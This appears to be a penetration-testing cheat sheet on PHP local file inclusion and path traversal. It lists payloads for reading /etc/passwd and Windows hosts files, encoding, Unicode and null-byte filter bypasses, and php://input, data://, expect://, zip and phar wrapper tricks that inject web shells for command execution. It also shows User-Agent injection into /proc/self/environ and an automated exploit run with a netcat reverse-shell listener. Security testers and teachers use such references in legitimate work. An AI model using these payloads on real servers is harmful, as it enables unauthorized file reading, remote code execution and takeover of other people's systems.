# Local File Inclusion and Path Traversal  

LFI - Executing local server files with PHP 'include', 'include_once', 'require' or 'require_once' functions.  

### Path traversal  
Path traversal means traversing the file structure with '../' or '..\\' sequences in order to read files 'below' the web server file path. Path traversals can be only used to read files on a web server, without execution.

```php
<?php include($_GET['file']); ?>
```

`http://linux_server/site.php?file=/../../../../../../../../../etc/passwd`  
`http://windows_server/site.php?file=\..\..\..\..\..\..\..\..\..\Windows\System32\drivers\etc\hosts`  

### Path normalization
Path normalization is done implicitly within PHP. Multiple subsequent slashes, as well as './' and '/.' are automatically stripped. This can be used to bypass bad sanitization.    
```php
<?php
# Disable inclusion of files ending with 'passwd'
if(substr($_GET['file'], -6, 6) != "passwd"){
   include($_GET['file']);
}
?>
```
`http://server/site.php?file=badfolder../../../../../../../../../../../etc/passwd/.`  
`http://server/site.php?file=badfolder../../../../../../../../../../../././././etc/././passwd/./.`  
`http://server/site.php?file=badfolder../../../../../../../../../../../../..////etc/////passwd/.`  

### Sanitization bypass
`?file=existingfolder/../../../../../../../../etc/passwd`  
`?file=doesnotexist../../../../../../../../../../.././etc/.//.//passwd//.`  
`?file=.+./.+./.+./.+./.+./.+./.+./.+./.+./.+./etc/passwd`  
`?file=....//....//....//....//etc/passwd`   
`?file=..///////..////..//////etc/passwd`  
`?file=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd`  
`?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`  
`?file=%252e/%252e/%252e/%252e/%252e/etc/passwd`  

Unicode bypass  
NodeJS path handling libraries are internally stripping \xFF. By placing a Ｎ character (full width latin N) or (U+FF2E), since FF is stripped, what remains is 2E - url decoded '.' (dot)  
`?file=ＮＮ/ＮＮ/ＮＮ/ＮＮ/ＮＮ/etc/passwd`  
`?file=ＮＮ\ＮＮ\ＮＮ\ＮＮ\ＮＮ\Windows\System32\drivers\etc\hosts`  

### Nullbyte injection 
When '.php' is appended, it can be bypassed with nullbyte in php versions before 5.3.4, or if 'magic_quotes_gpc' is set to Off.  
 
```php
<?php include($_GET['file'] . ".php"); ?>
```
`http://server/site.php?file=../../../../../../../../etc/passwd%00`  
`http://server/site.php?file=../../../../../../../../etc/passwd%2500`  
`http://server/site.php?file=../../../../../../../../etc/passwd\0`   


### File wrapper
`http://server/site.php?parameter=file:///etc/passwd`  

### Filter wrapper
Filter wrapper can be used as a bypass method. Loading/Including php file will execute it, therefore source code won't be shown. With filter wrapper source code can be disclosed in a form of encoded string, which will need to be decoded.  
`http://server/site.php?file=php://filter/resource=/etc/passwd`  
`http://server/site.php?file=php://filter/convert.base64-encode/resource=/etc/passwd`  
`http://server/site.php?file=php://filter/read=string.rot13/resource=/etc/passwd` 

### Data wrapper command execution
`http://server/site.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20/etc/passwd`  

### Input wrapper command execution
`curl -X POST "http://server/site.php?file=php://input&cmd=cat%20/etc/passwd" -d "<?php shell_exec($_GET['cmd']); ?>"`    
`curl -X POST "http://server/site.php?file=php://input&cmd=cat%20/etc/passwd" -d "<?php passthru($_GET['cmd']); ?>"`  
`curl -X POST "http://server/site.php?file=php://input&cmd=cat%20/etc/passwd" -d "<?php echo system($_GET['cmd']); ?>"`  
`curl -X POST "http://server/site.php?file=php://input" -d "<?php echo system('whoami'); ?>"`  

### Expect wrapper command execution
Very rare and by default not enabled.  
`http://server/site.php?file=expect://cat%20/etc/passwd`  

### Zip wrapper code execution
Zip wrapper can be used in order to gain code execution, with uploaded archive that has zipped malicious .php file inside it.    
`http://server/site.php?file=zip://uploads/shell.zip%23shell.php`      

### Phar wrapper code execution
Create malicious phar file with reverse shell or custom malicious code inside it - represented as 'mal.jpg'.  
```php
 <?php
    $p = new PharData(dirname(__FILE__).'/pharfile.zip',0,'pharfile2',Phar::ZIP);
    $x = file_get_contents('./reverse_shell.php');
    $p->addFromString('mal.jpg', $x);
  ?>
```
Compile phar with `php --define phar.readonly=0 create_path.php`  
`http://server/site.php?file=phar://pharfile.zip/mal.jpg`  

### /proc/self/environ code execution
If environ file can be included User-Agent string can be used in order to achieve rce. Make sure User-Agent is inside /proc/self/environ for this to work.       

`curl http://server/index.php?file=/proc/self/environ&cmd=id -H "User-Agent: <?php echo system($_GET['cmd']);?>"`


### Lfimap

[Lfimap](https://github.com/hansmach1ne/lfimap), local file inclusion discovery and exploitation tool.  
Automatically tests lfi WITH filter, data, input, expect and file wrappers and path truncation.

Test GET parameters  
`sudo python3 lfimap.py "http://server/index.php?page=PWN"`  

Test POST parameters   
`sudo python3 lfimap.py "http://server/index.php" -D "page=PWN"`  


Exploit vulnerable target automatically    
`sudo rlwrap nc -nvlp 99`  
`sudo python3 lfimap.py "http://server/index.php?page=PWN" -x --lhost <ip> --lport 99`
